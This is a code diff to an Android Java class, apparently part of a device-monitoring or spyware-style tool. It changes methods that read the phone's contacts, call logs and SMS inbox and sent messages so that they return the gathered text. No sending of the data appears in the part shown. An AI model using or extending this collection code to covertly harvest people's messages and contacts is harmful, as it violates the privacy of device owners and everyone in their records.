@@ -28,7 +28,8 @@ public class deviceData {
     WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
 
 
-    public void readcontacts() {
+    public StringBuilder readcontacts() {
+        StringBuilder contactOut = new StringBuilder();
         Uri uri = ContactsContract.Contacts.CONTENT_URI; //contacts URI
         Cursor contacts = mContext.getContentResolver().query(uri, null, null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC"); //contacts Cursor
         if (contacts != null && contacts.moveToFirst()) {
@@ -37,7 +38,6 @@ public class deviceData {
                 Cursor contactsData = mContext.getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, ContactsContract.Data.CONTACT_ID + " = " + contactId, null, null);
                 String displayName;
                 String phoneNumber = "";
-                StringBuilder contactOut = new StringBuilder();
 
                 if (contactsData != null && contactsData.moveToFirst()) {
                     displayName = contactsData.getString(contactsData.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
@@ -53,9 +53,10 @@ public class deviceData {
             } while (contacts.moveToNext());
             contacts.close();
         }
+        return contactOut;
     }
 
-    public void readcalllogs() {
+    public StringBuilder readcalllogs() {
 
         StringBuilder callLogOut = new StringBuilder();
         callLogOut.append("Call Log : ");
@@ -92,10 +93,10 @@ public class deviceData {
             } clCursor.close();
 
         }
-
+        return  callLogOut;
     }
     public void getLocation(){}
-    public void readsms(){
+    public StringBuilder readsms(){
         StringBuilder SMS = new StringBuilder();
         Uri InboxSms = Uri.parse("content://sms/inbox");
         Uri SentSms = Uri.parse("content://sms/sent");
@@ -123,6 +124,7 @@ public class deviceData {
                         append("............................................");
             }
         } sent.close();
+        return SMS;
     }
     public void readphonestate (){
 
